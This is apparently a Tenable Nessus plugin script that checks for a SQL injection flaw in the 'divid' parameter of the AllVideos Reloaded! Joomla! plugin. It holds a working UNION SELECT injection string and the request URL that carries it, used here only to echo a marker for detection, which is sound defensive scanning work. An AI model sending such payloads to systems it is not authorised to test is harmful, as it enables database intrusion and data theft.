#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(55623);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2017/05/19 13:58:06 $");

  script_bugtraq_id(48708);

  script_name(english:"AllVideos Reloaded! Plugin for Joomla! 'divid' Parameter SQLi");
  script_summary(english:"Attempts to manipulate code used for popup.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the AllVideos Reloaded! plugin for Joomla! running on
the remote host is affected by a SQL injection vulnerability in the
views/popup/view.html.php script due to improper sanitization of
user-supplied input to the 'divid' parameter before using it to
construct database queries. Regardless of the PHP 'magic_quotes_gpc'
setting, an unauthenticated, remote attacker can exploit this issue to
manipulate database queries, resulting in disclosure of sensitive
information, modification of data, or other attacks against the
underlying database.");
  # http://joomlacode.org/gf/project/allvideos15/forum/?action=ForumBrowse&forum_id=7580&_forum_action=ForumMessageBrowse&thread_id=21138
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ead52621");
  script_set_attribute(attribute:"solution", value:
"Upgrade to AllVideos Reloaded! version 1.2.7 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/07/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/07/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/07/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "AllVideos Reloaded!";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>AvReloaded<');
  checks["/administrator/components/com_avreloaded/com_avreloaded.xml"]=regexes;

  # In case /administrator is protected
  checks["/components/com_avreloaded/controller.php"][0]=make_list("undefined function jimport()");

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to exploit the issue to generate a SQL error.
magic1 = rand() % 100;
magic2 = SCRIPT_NAME - ".nasl";
exploit = "avreloaded0' UNION SELECT '" + magic2 + "' -- '";

url = '/index.php?option=com_avreloaded&view=popup&Itemid=' + magic1 + '&' +
  'divid=' + str_replace(find:" ", replace:"+", string:exploit);

res = http_send_recv3(
  port   : port,
  method : "GET",
  item   : dir + url,
  exit_on_fail : TRUE
);

found_str = '<!-- AVRSYS_IN_POPUP --><!-- PLG_CLIPBOARD_DISABLE -->' + magic2;
if (found_str >< res[2])
{
  output = strstr(res[2], found_str);
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    line_limit  : 5,
    sqli        : TRUE,
    generic     : TRUE,
    request     : make_list(install_url + url),
    output      : chomp(output),
    rep_extra   : '\nNote that it may be necessary to view the source of the page in order\nto see the string as the default style is a black page.'
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin.");
